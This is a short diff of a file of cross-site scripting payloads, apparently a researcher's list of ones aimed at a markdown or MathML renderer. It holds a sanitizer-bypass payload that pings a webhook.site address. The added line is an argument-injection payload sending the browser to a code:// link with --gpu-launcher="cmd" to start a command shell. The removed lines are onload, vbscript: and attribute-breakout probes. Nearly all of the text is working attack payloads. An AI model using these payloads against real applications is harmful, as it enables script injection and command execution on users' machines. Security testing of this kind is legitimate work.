@@ -4,15 +4,6 @@
 ">a<math>a<xss style=display:block>t<style>X<a title=""</style>a<img src='https://webhook.site/830d2611-45c3-4448-9b8d-c80b74811960' onerror=alert()>">.<a>.
 
 
-">a<math>a<xss style=display:block>t<style>X<a title=""</style>a<img src=x onerror=alert()>">.<a>.
+">a<math>a<xss style=display:block>t<style>X<a title=""</style>a<img src=x onerror='window.location=code://aaaaaaaaa" --gpu-launcher="cmd" --aaaaa='>">.<a>.
 
-<img onload='alert()'>
-
-var xx = <math style=""><img onload=xxx>
-
-
-![vbscript:alert()](vbscript:alert())
-
-
-![Uh oh...](https://www.example.com/image.png"onload="alert('XSS'))
-
+<math>asdasda</math>
